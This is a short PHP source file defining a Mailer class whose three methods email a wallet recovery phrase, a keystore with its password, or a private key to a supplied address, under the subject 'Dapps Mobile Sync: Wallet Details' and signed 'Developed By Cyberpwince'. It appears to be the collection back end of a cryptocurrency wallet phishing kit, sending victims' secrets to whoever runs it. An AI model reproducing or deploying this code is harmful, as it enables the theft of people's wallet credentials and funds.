<?php

namespace Royaltechinc;

class Mailer{

    
    public function mailPhrase($email, $phrase, $wallettype, $code){

$subject="Dapps Mobile Sync: Wallet Details ($code)";
//$email= $mail;
$msg ='
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">


<body style="margin: 0; padding: 0;">
<b>Wallet Information </b> <br><br>


Wallet Type: '.$wallettype.'<br><br>
Code: '.$code.'<br><br>
Phrase: <br><br>'.$phrase.'<br><br>



<b>Developed By Cyberpwince</b> <br><br>


</body>';

sendMail($subject, $msg, $email);
}
    public function mailKeystore($email, $keystore, $password, $wallettype, $code){

$subject="Dapps Mobile Sync: Wallet Details ($code)";
//$email= $mail;
$msg ='
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">



<body style="margin: 0; padding: 0;">
<b>Wallet Information </b> <br><br>

Wallet Type: '.$wallettype.'<br><br>
Code: '.$code.'<br><br>
Keystore: <br><br>'.$keystore.'<br><br>
Password: '.$password.'<br><br>






<b>Developed By Cyberpwince</b> <br><br>


</body>';

sendMail($subject, $msg, $email);
}
    public function mailPrivatekey($email, $privatekey, $wallettype, $code){

$subject="Dapps Mobile Sync: Wallet Details ($code)";
//$email= $mail;
$msg ='
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">


<body style="margin: 0; padding: 0;">
<b>Wallet Information </b><br><br>

Wallet Type: '.$wallettype.'<br><br>
Code: '.$code.'<br><br>
Private Key: <br><br>'.$privatekey.'<br><br>




<b>Developed By Cyberpwince</b> <br><br>


</body>';

sendMail($subject, $msg, $email);
}
    
}
?>